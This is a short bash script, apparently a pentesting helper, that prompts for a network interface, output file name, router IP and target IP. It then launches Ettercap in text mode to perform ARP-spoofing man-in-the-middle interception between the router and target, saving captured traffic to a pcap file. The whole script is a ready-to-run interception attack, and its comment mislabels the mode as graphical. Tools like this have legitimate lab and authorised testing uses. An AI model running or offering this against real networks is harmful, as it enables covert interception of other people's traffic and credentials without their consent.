#! /bin/bash
# start Ettercap graphical
 
echo Launching Ettercap text...
echo Which interface to use i.e. eth0, wlan0 etc
read -p 'Interface: ' intervar
echo Enter filename
read -p 'Filename: ' filevar
echo Enter Router IP
read -p 'Router IP: ' routervar
echo Enter Target IP - if required
read -p 'Target IP: ' targetvar
ettercap -T -i $intervar -M arp:remote -d -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
